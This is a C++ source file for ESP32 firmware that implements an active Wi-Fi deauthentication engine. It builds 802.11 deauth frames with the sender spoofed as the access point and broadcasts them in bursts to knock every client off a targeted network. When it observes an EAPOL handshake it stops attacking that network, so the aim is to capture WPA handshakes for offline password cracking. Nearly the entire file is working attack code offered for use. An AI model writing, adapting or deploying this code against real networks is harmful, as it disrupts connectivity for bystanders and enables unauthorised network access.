#include "DeauthEngine.h"

#include <Arduino.h>
#include <Logging.h>
#include <esp_wifi.h>

#include <climits>
#include <cstring>

#include "TargetList.h"

DeauthEngine deauthEngine;

namespace {
// 802.11 deauthentication frame: fixed 24-byte MAC header plus a 2-byte reason code, no frame
// body beyond that and no FCS (esp_wifi_80211_tx's radio appends the FCS in hardware).
struct __attribute__((packed)) DeauthFrame {
  uint16_t frameControl;  // 0x00C0 on this little-endian MCU -> wire bytes {0xC0, 0x00}: management/deauth
  uint16_t durationId;
  uint8_t addr1[6];  // destination
  uint8_t addr2[6];  // source (spoofed as the AP, so clients trust it)
  uint8_t addr3[6];  // BSSID
  uint16_t seqCtrl;   // left at 0; en_sys_seq=true below tells the driver to fill in a real one
  uint16_t reasonCode;
};

constexpr uint16_t kFrameControlDeauth = 0x00C0;
constexpr uint16_t kReasonClass3FromNonassoc = 0x0007;

// See DeauthEngine.h's class comment: re-enabled behind a transient WIFI_MODE_STA switch scoped
// to a single burst, rather than the permanent STA mode that crashed the device before. Flip back
// to false if real-hardware testing shows this still isn't safe.
constexpr bool kTxCapable = true;
}  // namespace

bool DeauthEngine::begin() {
  memset(trackers, 0, sizeof(trackers));
  totalBursts = 0;
  totalFrames = 0;
  return true;
}

void DeauthEngine::setEnabled(bool value) {
  if (enabled == value) return;
  enabled = value;
  LOG_INF("DEAUTH", "Active deauth %s", enabled ? "enabled" : "disabled");
}

DeauthEngine::BssidTrack& DeauthEngine::trackerFor(uint32_t bssidHash) {
  int freeSlot = -1;
  size_t lruSlot = 0;
  unsigned long lruMs = ULONG_MAX;
  for (size_t i = 0; i < kTrackCapacity; i++) {
    if (trackers[i].inUse && trackers[i].bssidHash == bssidHash) return trackers[i];
    if (!trackers[i].inUse) {
      if (freeSlot < 0) freeSlot = static_cast<int>(i);
    } else if (trackers[i].lastBurstMs < lruMs) {
      // Least-recently-bursted in-use slot, tracked as the fallback eviction target once the
      // table is full. Entries that never actually fired (lastBurstMs == 0) always sort first
      // here, so they're evicted before anything with a real cooldown in progress — losing an
      // untouched placeholder costs nothing, but wiping a live cooldown was the bug (see
      // kTrackCapacity's comment: evicting a fixed slot 0 instead of the actual LRU entry let a
      // BSSID's cooldown memory get wiped by unrelated new networks appearing, letting it burst
      // again within milliseconds instead of respecting kCooldownMs).
      lruMs = trackers[i].lastBurstMs;
      lruSlot = i;
    }
  }
  const size_t slot = freeSlot >= 0 ? static_cast<size_t>(freeSlot) : lruSlot;
  trackers[slot] = BssidTrack{bssidHash, 0, false, true};
  return trackers[slot];
}

bool DeauthEngine::sendDeauthBurst(const MacAddress& bssid, uint8_t channel) {
  totalBursts++;
  if (!kTxCapable) return false;

  DeauthFrame frame{};
  frame.frameControl = kFrameControlDeauth;
  frame.durationId = 0;
  memset(frame.addr1, 0xFF, 6);  // broadcast: deauth every client currently associated to this BSSID at once
  memcpy(frame.addr2, bssid.bytes, 6);
  memcpy(frame.addr3, bssid.bytes, 6);
  frame.seqCtrl = 0;
  frame.reasonCode = kReasonClass3FromNonassoc;

  // Transient TX-capable mode, scoped to just this burst — see DeauthEngine.h's class comment for
  // why bracketing it this way (rather than the permanent STA mode that crashed the device
  // before) is expected to avoid the esp-aes interrupt-allocation conflict. WifiSniffer's own
  // resting mode (WIFI_MODE_NULL) is untouched by this — it's switched back the moment the burst
  // is done, win or lose.
  const esp_err_t modeErr = esp_wifi_set_mode(WIFI_MODE_STA);
  if (modeErr != ESP_OK) {
    LOG_ERR("DEAUTH", "esp_wifi_set_mode(STA) failed: %d — skipping burst", modeErr);
    return false;
  }

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  bool anyFailed = false;
  for (uint8_t i = 0; i < kFramesPerBurst; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true) != ESP_OK) {
      anyFailed = true;
    }
    totalFrames++;
    delay(2);
  }

  const esp_err_t revertErr = esp_wifi_set_mode(WIFI_MODE_NULL);
  if (revertErr != ESP_OK) {
    // Failing to revert is worse than failing to transmit — leaving the radio in STA mode is
    // exactly the persistent-mode situation that crash-looped before. Surface it loudly; there's
    // nothing else to do about it here besides let the heap-health circuit breaker's restart
    // (main.cpp) recover to a clean boot.
    LOG_ERR("DEAUTH", "esp_wifi_set_mode(NULL) revert failed: %d — radio may be stuck in STA mode",
            revertErr);
  }
  return !anyFailed;
}

void DeauthEngine::onObservation(const WifiObservation& obs) {
  if (!enabled) return;
  if (obs.kind != WifiFrameKind::Beacon && obs.kind != WifiFrameKind::ProbeResponse &&
      obs.kind != WifiFrameKind::EapolHandshake) {
    return;  // only BSSID-confirming frames (beacon/probe-resp) and handshake frames feed targeting
  }

  const uint32_t bssidHash = obs.bssid.fnv1a();
  BssidTrack& track = trackerFor(bssidHash);

  if (obs.kind == WifiFrameKind::EapolHandshake) {
    track.handshakeSeen = true;  // got what we came for — stop attacking this BSSID
    return;
  }

  if (track.handshakeSeen) return;
  if (!targetList.isAllowed(obs.bssid)) return;

  const unsigned long now = millis();
  if (track.lastBurstMs != 0 && now - track.lastBurstMs < kCooldownMs) return;
  track.lastBurstMs = now;

  LOG_INF("DEAUTH", "Deauth burst: %02X:%02X:%02X:%02X:%02X:%02X ch%u", obs.bssid.bytes[0], obs.bssid.bytes[1],
          obs.bssid.bytes[2], obs.bssid.bytes[3], obs.bssid.bytes[4], obs.bssid.bytes[5], obs.channel);
  sendDeauthBurst(obs.bssid, obs.channel);
}
